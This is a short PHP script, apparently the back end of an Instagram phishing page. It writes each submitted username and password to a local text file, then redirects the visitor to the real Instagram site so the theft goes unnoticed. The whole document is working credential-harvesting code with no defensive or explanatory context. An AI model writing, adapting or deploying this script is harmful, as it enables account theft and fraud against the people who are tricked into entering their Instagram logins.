<?php

file_put_contents("usuarios.txt", "Instgram User: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>